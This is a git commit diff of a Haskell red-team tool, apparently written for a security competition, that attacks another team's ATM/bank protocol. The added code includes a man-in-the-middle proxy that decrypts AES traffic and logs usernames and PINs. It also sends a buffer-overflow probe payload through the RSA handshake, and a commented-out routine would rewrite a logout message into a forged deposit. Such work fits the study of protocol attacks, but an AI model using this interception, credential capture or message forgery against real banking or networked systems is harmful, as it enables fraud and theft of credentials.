43c48d47592d5ffca0031ae5295be705bd3f0277
Avi Weinstock <aweinstock314@gmail.com>
2015-12-04 09:53:53 -0500

    Progess on exploitation of the other team's server.

--- redteam/MitmProxy.hs
+++ redteam/MitmProxy.hs
@@ -28,6 +28,8 @@ import qualified Data.ByteString.Lazy as L
 readMaybe = fmap fst . listToMaybe . reads
 
 lToStrict = B.concat . L.toChunks
+stringToBS = B.pack . map (fromIntegral . ord)
+bsToString = map (chr . fromIntegral) . B.unpack
 
 port = PortNumber . fromIntegral
 unPort (PortNumber x) = x
@@ -39,6 +41,7 @@ main' _ = getProgName >>= \name -> putStrLn $ "Usage: " ++ name ++ " ATM_PORT BA
 
 main'' atmPort bankPort = do
     listener <- listenOn atmPort
+    forkIO $ connectTo "localhost" bankPort >>= handshakeExploit
     forever $ accept listener >>= forkIO . doMitm bankPort
 
 dumbProxy atm bank logTo logFrom = loop where
@@ -85,6 +88,7 @@ mitmHandshake atm bank logTo logFrom = do
     --print bankPub
     --print mitmPub
     let bankPub' = bankPub { public_size = pubSizeBits `div` 8 } -- fiddle with things to get them to work
+    print bankPub'
     B.hPut atm (encodeX509Pubkey mitmPub)
     encAES <- B.hGetSome atm bufferSize
     --logTo encAES
@@ -115,14 +119,102 @@ mitmHandshake atm bank logTo logFrom = do
     B.hPut atm "DUMMY"
     return (aes, aesIV)
 
+
+handshakeExploit bank = do
+    let bufferSize = 4096
+    let pubSizeBits = 3072
+    B.hPut bank "DUMMY"
+    bankPubRaw <- B.hGetSome bank bufferSize
+    let Just bankPub = decodeX509Pubkey (L.fromChunks [bankPubRaw])
+    let bankPub' = bankPub { public_size = pubSizeBits `div` 8 } -- fiddle with things to get them to work
+    print bankPub'
+    --let payload = B.replicate 342 0x41
+    let payload' = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadka"
+    let payload = B.concat [B.replicate 36 0x41, B.replicate 4 1, B.replicate 302 0x42]
+    putStr "Raw Payload: "
+    print $ payload
+    Right encPayload <- encrypt (defaultOAEPParams SHA1) bankPub' $ payload
+    putStr "Encrypted Payload: "
+    print $ encPayload
+    B.hPutStr bank encPayload
+    Right encIV <- encrypt (defaultOAEPParams SHA1) bankPub' $ B.replicate 20 0x43
+    expect bank "DUMMY"
+    B.hPutStr bank encIV
+    B.hPutStr bank "dummy"
+    expect bank "DUMMY"
+
+
+data ActionType = Balance | Deposit | Login | Logout | Malformed | Transfer | Unknown | Withdraw
+    deriving (Enum, Eq, Show)
+
+data Action = Action {
+    actUser :: B.ByteString,
+    actPin :: B.ByteString,
+    actOldNonce :: B.ByteString,
+    actNewNonce :: B.ByteString,
+    actCmd :: ActionType,
+    actAmount :: Int, -- cents
+    actRecipient :: B.ByteString
+    } deriving Show
+
+deserializeAction :: B.ByteString -> Maybe Action
+deserializeAction s = aux where
+    readB = readMaybe . bsToString
+    split' c = B.split (fromIntegral $ ord c)
+    aux = case map (split' ';') $ split' ':' s of
+        [[oldNonce, newNonce],[_],[user,pin,cmd,amount,recipient],[_]] -> do
+            cmd' <- readB cmd
+            return $ Action {
+                actUser = user,
+                actPin = pin,
+                actOldNonce = oldNonce,
+                actNewNonce = newNonce,
+                actCmd = toEnum cmd',
+                actAmount = maybe 0 id $ readB amount,
+                actRecipient = recipient
+                }
+        _ -> Nothing
+
+serializeAction :: MonadRandom m => Action -> m B.ByteString
+serializeAction (Action user pin oNonce nNonce cmd amt reci) = do
+    let actionBufferSize = 128
+    let cmd' = stringToBS . show $ fromEnum cmd
+    let amt' = stringToBS $ show amt
+    let pad1Size = 1
+    let pad2Size = actionBufferSize - (sum (map B.length [oNonce, nNonce, user, pin, cmd', amt', reci]) + 8)
+    pad1 <- getRandomBytes pad1Size
+    pad2 <- getRandomBytes pad2Size
+    return $ B.intercalate ":" [
+        B.intercalate ";" [oNonce, nNonce],
+        pad1,
+        B.intercalate ";" [user, pin, cmd', amt', reci],
+        pad2
+        ]
+
+-- unfortunately, this is checked for, and the server prints "These shouldn't happen." to stdout
+replaceLogoutWithDeposit aes aesIv action ctxt = if actCmd action == Logout
+    then do
+        let action' = action { actCmd = Deposit, actAmount = 31337 } 
+        ptxt' <- serializeAction action'
+        return $ cfbEncrypt aes aesIv ptxt'
+    else return ctxt
+
 passiveMitm atm bank logTo logFrom aes aesIv = dumbProxy atm bank (wrap logTo) (wrap logFrom) where
     bufferSize = 4096
     wrap log ctxt = do
         let ptxt = cfbDecrypt (aes :: AES128) aesIv ctxt
-        let split' c = B.split (fromIntegral $ ord c)
-        log ptxt
-        print . map (split' ';') . split' ':' $ ptxt
-        return ctxt
+        --let split' c = B.split (fromIntegral $ ord c)
+        --print . map (split' ';') . split' ':' $ ptxt
+        let action = deserializeAction ptxt
+        case deserializeAction ptxt of
+            Just action -> do
+                log (stringToBS $ show action)
+                -- TODO: just intercept pins and spawn a seperate connection (less invasive)
+                --replaceLogoutWithDeposit aes aesIv action ctxt
+                return ctxt
+            _ -> do
+                log ptxt
+                return ctxt
 
 doMitm bankPort (atm, host, atmPort) = do
     putStrLn $ "Received a connection from " ++ host ++ ":" ++ show atmPort
